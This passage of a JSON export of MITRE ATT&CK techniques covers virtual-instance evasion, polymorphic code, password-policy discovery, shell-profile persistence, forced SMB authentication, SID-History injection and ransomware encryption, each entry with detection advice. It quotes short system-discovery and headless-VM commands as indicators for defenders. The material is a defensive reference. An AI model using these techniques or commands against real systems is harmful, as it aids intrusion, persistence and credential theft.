      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1036.001",
      "stix_id": "attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52",
      "created": "2020-02-10T19:49:46.752000+00:00",
      "modified": "2025-04-15T22:43:00.641000+00:00",
      "platforms": [
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment, look for invalid signatures as well as unusual certificate characteristics and outliers."
    },
    "T1564.006": {
      "id": "T1564.006",
      "name": "Run Virtual Instance",
      "description": "Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance.(Citation: CyberCX Akira Ransomware) Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)\n\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)\n\nIn VMWare environments, adversaries may leverage the vCenter console to create new virtual machines. However, they may also create virtual machines directly on ESXi servers by running a valid `.vmx` file with the `/bin/vmx` utility. Adding this command to `/etc/rc.local.d/local.sh` (i.e., [RC Scripts](https://attack.mitre.org/techniques/T1037/004)) will cause the VM to persistently restart.(Citation: vNinja Rogue VMs 2024) Creating a VM this way prevents it from appearing in the vCenter console or in the output to the `vim-cmd vmsvc/getallvms` command on the ESXi server, thereby hiding it from typical administrative activities.(Citation: MITRE VMware Abuse 2024)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.006",
      "stix_id": "attack-pattern--b5327dd1-6bf9-4785-a199-25bcbd1f4a9d",
      "created": "2020-06-29T15:36:41.535000+00:00",
      "modified": "2025-04-15T19:58:59.831000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Modification",
        "Image: Image Metadata",
        "Service: Service Creation",
        "Process: Process Creation",
        "File: File Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring for files and processes associated with running a virtual instance, such as binary files associated with common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). Consider monitoring the size of virtual machines running on the system. Adversaries may create virtual images which are smaller than those of typical virtual machines.(Citation: Shadowbunny VM Defense Evasion) Network adapter information may also be helpful in detecting the use of virtual instances.\n\nConsider monitoring for process command-line arguments that may be atypical for benign use of virtualization software. Usage of virtualization binaries or command-line arguments associated with running a silent installation may be especially suspect (ex. <code>-silent</code>, <code>-ignore-reboot</code>), as well as those associated with running a headless (in the background with no UI) virtual instance (ex. <code>VBoxManage startvm $VM --type headless</code>).(Citation: Shadowbunny VM Defense Evasion) Similarly, monitoring command line arguments which suppress notifications may highlight potentially malicious activity (ex. <code>VBoxManage.exe setextradata global GUI/SuppressMessages \"all\"</code>).\n\nMonitor for commands which enable hypervisors such as Hyper-V.  If virtualization software is installed by the adversary, the Registry may provide detection opportunities. Consider monitoring for [Windows Service](https://attack.mitre.org/techniques/T1543/003), with respect to virtualization software. \n\nBenign usage of virtualization technology is common in enterprise environments, data and events should not be viewed in isolation, but as part of a chain of behavior."
    },
    "T1027.014": {
      "id": "T1027.014",
      "name": "Polymorphic Code",
      "description": "Adversaries may utilize polymorphic code (also known as metamorphic or mutating code) to evade detection. Polymorphic code is a type of software capable of changing its runtime footprint during code execution.(Citation: polymorphic-blackberry) With each execution of the software, the code is mutated into a different version of itself that achieves the same purpose or objective as the original. This functionality enables the malware to evade traditional signature-based defenses, such as antivirus and antimalware tools.(Citation: polymorphic-sentinelone) \nOther obfuscation techniques can be used in conjunction with polymorphic code to accomplish the intended effects, including using mutation engines to conduct actions such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010), or [Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013).(Citation: polymorphic-linkedin)(Citation: polymorphic-medium)\n",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.014",
      "stix_id": "attack-pattern--b577dfc1-0177-4522-8d5a-782127c8592b",
      "created": "2024-09-27T12:28:03.938000+00:00",
      "modified": "2025-04-15T19:59:00.006000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "File: File Creation",
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1201": {
      "id": "T1201",
      "name": "Password Policy Discovery",
      "description": "Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)\n\nPassword policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1201",
      "stix_id": "attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T19:59:00.168000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "IaaS",
        "Network Devices",
        "Identity Provider",
        "SaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Metadata",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor logs and processes for tools and command line arguments that may indicate they're being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity."
    },
    "T1546": {
      "id": "T1546",
      "name": "Event Triggered Execution",
      "description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546",
      "stix_id": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
      "created": "2020-01-22T21:04:23.285000+00:00",
      "modified": "2025-04-15T22:28:46.740000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "SaaS",
        "IaaS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "WMI: WMI Creation",
        "File: File Metadata",
        "File: File Creation",
        "File: File Modification",
        "Windows Registry: Windows Registry Key Modification",
        "Command: Command Execution",
        "Cloud Service: Cloud Service Modification",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring for additions or modifications of mechanisms that could be used to trigger event-based execution, especially the addition of abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network. Also look for changes that do not line up with updates, patches, or other planned administrative activity. \n\nThese mechanisms may vary by OS, but are typically stored in central repositories that store configuration information such as the Windows Registry, Common Information Model (CIM), and/or specific named files, the last of which can be hashed and compared to known good values. \n\nMonitor for processes, API/System calls, and other common ways of manipulating these event repositories. \n\nTools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.  \n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement. "
    },
    "T1546.004": {
      "id": "T1546.004",
      "name": "Unix Shell Configuration Modification",
      "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user\u2019s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. \n\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1546.004",
      "stix_id": "attack-pattern--b63a34e8-0a61-4c97-a23b-bf8a2ed812e2",
      "created": "2020-01-24T14:13:45.936000+00:00",
      "modified": "2025-04-15T19:59:00.346000+00:00",
      "platforms": [
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "File: File Creation",
        "Command: Command Execution",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "While users may customize their shell profile files, there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.\n\nMonitor for changes to <code>/etc/profile</code> and <code>/etc/profile.d</code>, these files should only be modified by system administrators. MacOS users can leverage Endpoint Security Framework file events monitoring these specific files.(Citation: ESF_filemonitor) \n\nFor most Linux and macOS systems, a list of file paths for valid shell options available on a system are located in the <code>/etc/shells</code> file.\n"
    },
    "T1187": {
      "id": "T1187",
      "name": "Forced Authentication",
      "description": "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.\n\nThe Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.\n\nWeb Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)\n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)\n\nThere are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:\n\n* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)\n* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\\\[remote address]\\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1187",
      "stix_id": "attack-pattern--b77cf5f3-6060-475d-bd60-40ccbf28fdc2",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-15T22:36:48.417000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Access",
        "Network Traffic: Network Traffic Flow",
        "File: File Modification",
        "File: File Creation",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems. If attempts are detected, then investigate endpoint data sources to find the root cause. For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.\n\nMonitor creation and modification of .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources as these could be used to gather credentials when the files are rendered. (Citation: US-CERT APT Energy Oct 2017)"
    },
    "T1134.005": {
      "id": "T1134.005",
      "name": "SID-History Injection",
      "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1134.005",
      "stix_id": "attack-pattern--b7dc639b-24cd-482d-a7f1-8897eda21023",
      "created": "2020-02-18T18:34:49.414000+00:00",
      "modified": "2025-04-25T14:47:45.982000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Active Directory: Active Directory Object Modification",
        "Process: OS API Execution",
        "User Account: User Account Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Examine data in user\u2019s SID-History attributes using the PowerShell <code>Get-ADUser</code> cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015) Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: Microsoft DsAddSidHistory)\n\nMonitor for Windows API calls to the <code>DsAddSidHistory</code> function. (Citation: Microsoft DsAddSidHistory)"
    },
    "T1599": {
      "id": "T1599",
      "name": "Network Boundary Bridging",
      "description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1599",
      "stix_id": "attack-pattern--b8017880-4b1e-42de-ad10-ae7ac6705166",
      "created": "2020-10-19T16:08:29.817000+00:00",
      "modified": "2025-04-16T20:37:19.349000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring network traffic on both interfaces of border network devices with out-of-band packet capture or network flow data, using a different device than the one in question.  Look for traffic that should be prohibited by the intended network traffic policy enforcement for the border network device.\n\nMonitor the border network device\u2019s configuration to validate that the policy enforcement sections are what was intended.  Look for rules that are less restrictive, or that allow specific traffic types that were not previously authorized."
    },
    "T1486": {
      "id": "T1486",
      "name": "Data Encrypted for Impact",
      "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) Adversaries may also encrypt virtual machines hosted on ESXi or other hypervisors.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021) \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers or ESXi server login messages, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)(Citation: Varonis)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1) For example, in AWS environments, adversaries may leverage services such as AWS\u2019s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data.(Citation: Halcyon AWS Ransomware 2025)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1486",
      "stix_id": "attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0",
      "created": "2019-03-15T13:59:30.390000+00:00",
      "modified": "2025-04-15T19:59:00.731000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "IaaS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Cloud Storage: Cloud Storage Modification",
        "Network Share: Network Share Access",
        "File: File Creation",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and command line parameters of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories.\n\nIn some cases, monitoring for unusual kernel driver installation activity can aid in detection.\n\nIn cloud environments, monitor for events that indicate storage objects have been anomalously replaced by copies."
    },
    "T1553": {
      "id": "T1553",
      "name": "Subvert Trust Controls",
      "description": "Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\n\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.(Citation: SpectorOps Subverting Trust Sept 2017) Adversaries may also create or steal code signing certificates to acquire trust on target systems.(Citation: Securelist Digital Certificates)(Citation: Symantec Digital Certificates) ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1553",
      "stix_id": "attack-pattern--b83e166d-13d7-4b52-8677-dff90c548fd7",
      "created": "2020-02-05T14:54:07.588000+00:00",
      "modified": "2025-04-15T19:59:00.906000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "Windows Registry: Windows Registry Key Creation",
        "File: File Metadata",
        "Command: Command Execution",
        "Process: Process Creation",
        "File: File Modification",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Collect and analyze signing certificate metadata on software that executes within the environment to look for unusual certificate characteristics and outliers. Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017) A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.(Citation: SpectorOps Code Signing Dec 2017)\n\nAnalyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure \"Hide Microsoft Entries\" and \"Hide Windows Entries\" are both deselected.(Citation: SpectorOps Subverting Trust Sept 2017) \n\nMonitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr</code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. "
    },
    "T1548.004": {
      "id": "T1548.004",
      "name": "Elevated Execution with Prompt",
      "description": "Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. \n\nAlthough this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",
      "tactic": "privilege-escalation",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1548.004",
      "stix_id": "attack-pattern--b84903f0-c7d5-435d-a69e-de47cc3578c0",
      "created": "2020-01-30T14:40:20.187000+00:00",
      "modified": "2025-04-16T20:37:19.503000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Consider monitoring for <code>/usr/libexec/security_authtrampoline</code> executions which may indicate that <code>AuthorizationExecuteWithPrivileges</code> is being executed. MacOS system logs may also indicate when <code>AuthorizationExecuteWithPrivileges</code> is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling."
    },
    "T1592.003": {
      "id": "T1592.003",
      "name": "Firmware",
      "description": "Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1592.003",
      "stix_id": "attack-pattern--b85f6ce5-81e8-4f36-aff2-3df9d02a9c9d",
      "created": "2020-10-02T16:46:42.537000+00:00",
      "modified": "2025-04-15T22:36:31.208000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1573": {
      "id": "T1573",
      "name": "Encrypted Channel",
      "description": "Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1573",
      "stix_id": "attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118",
      "created": "2020-03-16T15:33:01.739000+00:00",
      "modified": "2025-04-15T19:59:01.172000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
